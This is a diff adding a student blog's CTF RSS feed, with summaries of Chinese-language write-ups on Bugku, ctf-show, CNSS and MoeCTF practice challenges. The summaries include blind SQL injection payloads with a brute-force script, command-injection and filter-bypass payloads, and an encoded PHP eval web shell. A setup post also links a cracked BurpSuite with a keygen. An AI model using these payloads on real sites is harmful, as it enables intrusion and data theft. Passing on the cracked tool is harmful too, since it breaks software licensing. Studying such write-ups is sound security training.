@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CTF on Yiming</title>
+    <link>https://shenyimings.github.io/categories/ctf/</link>
+    <description>Recent content in CTF on Yiming</description>
+    <image>
+      <url>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 24 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://shenyimings.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Bugku-SQL注入-WriteUP</title>
+      <link>https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</guid>
+      <description>题目网址：sql注入
+一个很正经的界面，有实战那味了。
+上来先尝试经典组合：
+admin~password
+很幸运，用户名猜中了。
+利用单引号检测是否存在SQL注入
+admin&#39; or 1 = 1
+报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
+&#39;or&amp;lt;&amp;gt;(不等号)#()空格可用括号代替，等号可用相反的不等号
+先尝试是否存在布尔注入：
+成功，用户名存在注入~
+之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
+select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
+1&amp;#39;or((ascii(mid((select(password)from(admin))from(1))))&amp;lt;&amp;gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
+我们尝试下集束炸弹，让两个参数都作为目标
+第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
+爆破成功了。。。
+接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
+4dcc88f8f1bc05e7c2ad1a60288481a2
+去md5破解站破解一下，成功解出密码：
+bugkuctf
+结束了……
+反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
+贴一组大神的python自动脚本，以供学习
+#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = &amp;#39;http://114.67.246.176:19665/&amp;#39; sss = string.digits + (string.ascii_lowercase) a = &amp;#39;&amp;#39; for i in range(1, 50): flag = 0 for j in sss: payload = &amp;#34;admin&amp;#39;^((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)^1#&amp;#34; % (i, ord(j)) #屏蔽了&amp;#34;,&amp;#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&amp;lt;&amp;gt;表示不等号 #^表示异或 payload2= &amp;#34;admin123&amp;#39;or((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &amp;#34;admin123&amp;#39;or((ascii(mid((select(database()))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) data = {&amp;#39;username&amp;#39;: payload, &amp;#39;password&amp;#39;: &amp;#39;admin&amp;#39;} res = requests.</description>
+    </item>
+    
+    <item>
+      <title>CNSS Recruit-Web Write UP</title>
+      <link>https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/</link>
+      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/</guid>
+      <description>前言 躺在床上，不想动鼠标，那就先写写前言吧。
+这个CTF比赛是我打的第二场比较正规、完整的比赛。
+惨不忍睹，当然，作为刚入门的noob来说也可以接受。
+希望能通过笔记的整理消化新掌握的知识，道阻且长。
+[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
+关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
+python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
+Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
+git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
+其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
+[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
+第一反应是绕过和注入咯，尝试后无果。
+再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
+那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
+import requests import re # 正则表达式库 import string from requests.sessions import session url = &amp;#39;http://81.68.109.40:30005/&amp;#39; session = requests.</description>
+    </item>
+    
+    <item>
+      <title>RCE 远程命令执行漏洞</title>
+      <link>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</link>
+      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</guid>
+      <description>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
+Web 29 过滤了flag字样
+?c=system(&amp;quot;cat f*&amp;quot;);Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
+echo `cat f\lag.ph\p`; 反引号可以执行系统命令
+Web 31 在cat被禁时，我们还可以采用如下命令
+ 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
+ 空格的代替符号：
+ 1.${IFS}2.$IFS$13.${IFS4.%205.&amp;lt;和&amp;lt;&amp;gt;重定向符6.%09 构造本题payload
+?c=echo&amp;#39;more%09f*&amp;#39;;  其他题解：
+?c=eval($_GET[1]);&amp;amp;1=system(&amp;#39;cat flag.php&amp;#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=&amp;#34;\x73\x79\x73\x74\x65\x6d&amp;#34;(&amp;#34;nl%09fl[a]*&amp;#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo
+分号可以用?&amp;gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
+?c=include&amp;#34;$_GET[1]&amp;#34;?&amp;gt;&amp;amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &amp;lt;?php $filename=$_GET[&amp;#39;filename&amp;#39;]; $content=$_GET[&amp;#39;content&amp;#39;]; file_put_contents($filename,&amp;#34;&amp;lt;?php exit();&amp;#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
+我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
+base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
+?filename=php://filter/convert.base64-decode/resource=1.php&amp;amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &amp;lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !</description>
+    </item>
+    
+    <item>
+      <title>MoeCTF 2021 西电新生赛WP</title>
+      <link>https://shenyimings.github.io/post/12.moectf-web-write-up/</link>
+      <pubDate>Tue, 19 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/12.moectf-web-write-up/</guid>
+      <description>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
+想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
+1. Web安全入门指北-GET &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_GET[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
+在地址栏中发送get请求：
+http://47.93.215.154:10000/?moe=flag
+得到flag：
+moectf{We1c0me_t0_CTF_Web!}
+2. Web安全入门指北-POST &amp;lt;?php include &amp;#34;flag.php&amp;#34;; $moe = $_POST[&amp;#39;moe&amp;#39;]; if ($moe == &amp;#34;flag&amp;#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
+用hackbar：
+在post参数里填入moe=flag
+Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
+3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
+You are not VIP,I will give flag to VIP!
+可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
+用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
+将抓包结果发送到重发器，将VIP值改为1，点击发送。
+得到flag。
+4. 2048 打开环境，发现是一个2048小游戏</description>
+    </item>
+    
+    <item>
+      <title>CTF比赛方向选择</title>
+      <link>https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</guid>
+      <description>了解CTF  CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：
+ 比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。   CTF竞赛内容 常见六个分类
+  Web - 网络攻防
+考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。
+  RE - 逆向工程
+反编译、软件保护、反调试、软件加壳脱壳。
+  PWN - 二进制漏洞
+与计算机操作系统底层相关，主要出现在Linux平台上。
+  Crypto - 密码学
+古典密码与现代密码学安全两方面
+  Mobile - 移动安全
+安卓逆向相关
+  MISC - 安全杂项
+信息搜集（社工）、编码分析、取证分析、隐写分析等
+  比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。
+  Web
+作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。
+  Crypto
+选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。
+  次要方向：PWN</description>
+    </item>
+    
+    <item>
+      <title>DVWA环境搭建 &#43; BurpSuite2.1安装 &#43; Chrome配置</title>
+      <link>https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/</guid>
+      <description>[TOC]
+DVWA环境搭建  DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。
+ DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。
+PHPStudy：https://www.xp.cn/
+DVWA：http://www.dvwa.co.uk/
+一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA[&#39;db_password&#39;]=&#39;root&#39;行，将user改为‘root’；password改为‘root’。
+三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104
+为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。
+根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。
+四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库
+用户名：admin 默认密码：password
+登陆进入后即部署成功。
+BurpSuite2.1安装  BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
+ 1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg
+2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量
+新增两个环境变量
+  %JAVA_HOME%=jdk安装文件夹所在位置，如...\jdk1.8.0_201
+  %CLASSPATH%=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar
+  修改path变量，分别添加jdk和jre安装文件夹下的bin目录。
+3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件
+点击run
+将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。
+将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。
+此后想打开Burp Suite，双击运行目录下的VBS脚本即可。
+BurpSuite Chrome配置 1. 设置流量代理Proxy ​	在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127.</description>
+    </item>
+    
+    <item>
+      <title>MISC类型题目及技巧</title>
+      <link>https://shenyimings.github.io/post/6.bugku_misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/6.bugku_misc/</guid>
+      <description>图片隐写  图片EXIF信息 GIF图片 文件头 16进制编码  编码 Readflag
+社工   Bugku社工_进阶收集
+根据题目给出的说说截图，有如下信息：
+ 终点位置突出特征：有塔      坐地铁需要7站，中间还要转一站
+ 出发站为始发站 家位置在始发站和第二站的中间位置  根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。
+   Bugku_隐写)
+题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。
+正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。
+  </description>
+    </item>
+    
+    <item>
+      <title>Ubuntu 18.04 LTS的配置与入门</title>
+      <link>https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</guid>
+      <description>系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。
+载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！
+系统配置（学习网址：CSDN博客）  安装好后首先设置root用户, 更换apt数据源  sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源  deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.</description>
+    </item>
+    
+    <item>
+      <title>学习Markdown语法</title>
+      <link>https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</guid>
+      <description>2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。
+Windows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：
+ 有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。  Markdown语法  区块引用
+ 代码引用：
+printf(&amp;quot;使用反引号包裹代码&amp;quot;)
+int main() { int a; scanf(&amp;#34;%d&amp;#34;,&amp;amp;a); printf(&amp;#34;%d&amp;#34;,a++); return 0; } emoji: :smile:
+公式： $$ lim_{x \to\infty} \exp(-x) = 0 $$ 插入图片：</description>
+    </item>
+    
+    <item>
+      <title>暑假CTF学习计划</title>
+      <link>https://shenyimings.github.io/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://shenyimings.github.io/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
+      <description>学习内容 根据上一篇笔记选择的比赛方向：Web和Crypto，安排并希望在假期进行以下内容的学习：
+  Python编程基础-网络编程，并提升Python的水平取代C++成为自己最熟练的编程语言。
+  Linux系统学习（基于Ubuntu 18.04）目标：建站
+  SQL注入（SQL基本语法）
+  PHP基本语法
+  学习计划 假期苦短，每天效率也不高，单纯的看视频/看书想必毫无持续性，故而学习务必要结合实例，如我将《Learn Python 3 the HARD WAY》这本书作为Python的入门书籍，书中有大量例子，一个一个做下去有成就感推动前进，又能很好的掌握基础知识。
+   7.23-8.5 学习python 完成抓包项目     8.6-8.10 学习LINUX系统 BUGKU站刷题   8.11-8.15 Linux系统实战-建站   8.16-8.27 学习SQL注入相关知识    </description>
+    </item>
+    
+  </channel>
+</rss>
